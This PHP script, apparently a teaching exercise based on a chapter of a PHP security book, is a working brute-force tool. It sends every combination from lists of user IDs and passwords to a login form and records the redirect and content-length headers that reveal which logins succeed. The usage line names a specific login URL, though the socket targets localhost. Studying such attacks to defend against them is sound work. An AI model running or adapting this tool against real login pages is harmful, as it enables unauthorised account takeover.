<?php
/*
 * Based on Chris Shiflett, Essential PHP Security, 2005, O'Reilly
 * Chapter 7
 */
if (count($argv) != 7) {
    $s = "php bruteforceattack.php -- http:// web2.kevi1379.iba-abakomp.dk/login userids passwords results\n";
    $s .= "the latter three being filenames\n";
    die($s);
}
$host = $argv[2];
$url = $argv[3];
$ids = file_get_contents($argv[4]);
$idsa = explode("\n", $ids);
$pwds = file_get_contents($argv[5]);
$pwdsa = explode("\n", $pwds);
$results = $argv[6];

$http_header = '';
$http_header .= "POST /" . $url . " HTTP/1.1\r\n";
$http_header .= "Host: " . $host ."\r\n";
$http_header .= "Content-Type: application/x-www-form-urlencoded\r\n";
$http_header .= "Content-Length: %s\r\n";
$http_header .= "Connection: close\r\n";
$http_header .= "\r\n";

$s = '';
foreach($idsa as $uid) {
    foreach($pwdsa as $pwd) {
        $content  = 'user=';
        $content .= $uid;
        $content .= '&password=';
        $content .= $pwd;
        $request = $http_header . $content;
        $request = sprintf($request, strlen($content));
        $response = '';

        if ($handle = fsockopen('localhost', 80)) {
            fputs($handle, $request);
            while (!feof($handle)) {
                $response .= fgets($handle, 1024);
            }
            fclose($handle);
            /* Check response */
            //var_dump($response);
            preg_match('/Location: \S+/', $response, $m, PREG_OFFSET_CAPTURE);
            if (count($m))
                $s .= sprintf("\n%s %s", $content, $m[0][0]);
            preg_match('/Content-Length: \d+/', $response, $m, PREG_OFFSET_CAPTURE);
            if (count($m))
                $s .= sprintf("\n%s %s", $content, $m[0][0]);
        } else {
            /* Error in sockopen */
            die("WTF");
        }
        file_put_contents($results, $s);
    }
}
echo "\n";
?>